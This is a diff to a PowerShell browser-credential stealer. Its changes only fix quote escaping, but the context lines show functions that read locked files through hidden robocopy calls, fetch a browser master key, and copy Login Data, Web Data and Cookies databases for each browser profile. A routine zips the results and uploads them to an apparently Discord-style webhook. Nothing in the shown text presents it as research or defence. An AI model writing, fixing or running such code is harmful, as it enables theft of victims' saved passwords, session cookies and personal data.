@@ -33,7 +33,7 @@ function Noob-ReadLocked($path){
     }catch{}
   }
   try{$fs=[System.IO.File]::Open($path,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite);$ms=New-Object System.IO.MemoryStream;$fs.CopyTo($ms);$fs.Dispose();$b=$ms.ToArray();if($b.Length -gt 0){return $b}}catch{}
-  try{$cp=[IO.Path]::Combine($tmp,"rl_$([Guid]::NewGuid().ToString(\"N\").Substring(0,6))_$(Split-Path $path -Leaf)");$si=New-Object System.Diagnostics.ProcessStartInfo("robocopy.exe","/B /NP /NJS /NJH /R:0 /W:0 `"$(Split-Path $path)`" `"$tmp`" `"$(Split-Path $path -Leaf)`"");$si.WindowStyle="Hidden";$si.CreateNoWindow=$true;$si.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit(4000);$rp=[IO.Path]::Combine($tmp,$(Split-Path $path -Leaf));if(Test-Path $rp){$b=[IO.File]::ReadAllBytes($rp);Remove-Item $rp -EA 0;if($b.Length -gt 0){return $b}}}catch{}
+  try{$cp=[IO.Path]::Combine($tmp,"rl_$([Guid]::NewGuid().ToString('N').Substring(0,6))_$(Split-Path $path -Leaf)");$si=New-Object System.Diagnostics.ProcessStartInfo("robocopy.exe","/B /NP /NJS /NJH /R:0 /W:0 `"$(Split-Path $path)`" `"$tmp`" `"$(Split-Path $path -Leaf)`"");$si.WindowStyle="Hidden";$si.CreateNoWindow=$true;$si.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit(4000);$rp=[IO.Path]::Combine($tmp,$(Split-Path $path -Leaf));if(Test-Path $rp){$b=[IO.File]::ReadAllBytes($rp);Remove-Item $rp -EA 0;if($b.Length -gt 0){return $b}}}catch{}
   return $null
 }
 function Noob-GetMasterKey($lsPath){
@@ -44,7 +44,7 @@ function Noob-SendZip($zwh,$zpath,$zname,$zmsg){
     $zb=[IO.File]::ReadAllBytes($zpath)
     if($zb.Length -gt 9MB){Write-Host "zip too large: $($zb.Length)";return}
     $zbnd="B"+[Guid]::NewGuid().ToString("N")
-    $zmj=[Text.Encoding]::UTF8.GetBytes(\'{"content":"\'+$zmsg+\'"}\') 
+    $zmj=[Text.Encoding]::UTF8.GetBytes('{"content":"'+$zmsg+'"}')
     $zfh1=[Text.Encoding]::UTF8.GetBytes("--$zbnd`r`nContent-Disposition: form-data; name="+[char]34+"payload_json"+[char]34+"`r`nContent-Type: application/json`r`n`r`n")
     $zfh2=[Text.Encoding]::UTF8.GetBytes("`r`n--$zbnd`r`nContent-Disposition: form-data; name="+[char]34+"file"+[char]34+"; filename="+[char]34+"$zname"+[char]34+"`r`nContent-Type: application/zip`r`n`r`n")
     $zfh3=[Text.Encoding]::UTF8.GetBytes("`r`n--$zbnd--`r`n")
@@ -578,7 +578,7 @@ foreach($bn in $profiles.Keys){
     if(Test-Path $ld){
       $ldBytes=Noob-ReadLocked $ld
       if($ldBytes -and $ldBytes.Length -ge 100){
-        $ldTmp=[IO.Path]::Combine($tmp,"ld_$([Guid]::NewGuid().ToString(\"N\").Substring(0,6)).db")
+        $ldTmp=[IO.Path]::Combine($tmp,"ld_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
         [IO.File]::WriteAllBytes($ldTmp,$ldBytes)
         $walTmp=$ldTmp+"-wal";$walSrc=$ld+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
         try{
@@ -604,7 +604,7 @@ foreach($bn in $profiles.Keys){
     if(Test-Path $wd){
       $wdBytes=Noob-ReadLocked $wd
       if($wdBytes -and $wdBytes.Length -ge 100){
-        $wdTmp=[IO.Path]::Combine($tmp,"wd_$([Guid]::NewGuid().ToString(\"N\").Substring(0,6)).db")
+        $wdTmp=[IO.Path]::Combine($tmp,"wd_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
         [IO.File]::WriteAllBytes($wdTmp,$wdBytes)
         $walTmp2=$wdTmp+"-wal";$walSrc2=$wd+"-wal";if(Test-Path $walSrc2){$wb2=Noob-ReadLocked $walSrc2;if($wb2){[IO.File]::WriteAllBytes($walTmp2,$wb2)}}
         try{
@@ -653,7 +653,7 @@ foreach($bn in $profiles.Keys){
       if(-not(Test-Path $ckPath)){continue}
       $ckBytes=Noob-ReadLocked $ckPath
       if(-not $ckBytes -or $ckBytes.Length -lt 100){continue}
-      $ckTmp=[IO.Path]::Combine($tmp,"ckd_$([Guid]::NewGuid().ToString(\"N\").Substring(0,6)).db")
+      $ckTmp=[IO.Path]::Combine($tmp,"ckd_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
       [IO.File]::WriteAllBytes($ckTmp,$ckBytes)
       $walTmp=$ckTmp+"-wal";$walSrc=$ckPath+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
       try{
@@ -872,7 +872,7 @@ try{
         if(-not(Test-Path $ckPath)){continue}
         $ckBytes=Noob-ReadLocked $ckPath
         if(-not $ckBytes -or $ckBytes.Length -lt 100){continue}
-        $ckTmp=[IO.Path]::Combine($tmp,"ck_$([Guid]::NewGuid().ToString(\"N\").Substring(0,6)).db")
+        $ckTmp=[IO.Path]::Combine($tmp,"ck_$([Guid]::NewGuid().ToString('N').Substring(0,6)).db")
         [IO.File]::WriteAllBytes($ckTmp,$ckBytes)
         $walTmp=$ckTmp+"-wal";$walSrc=$ckPath+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
         try{
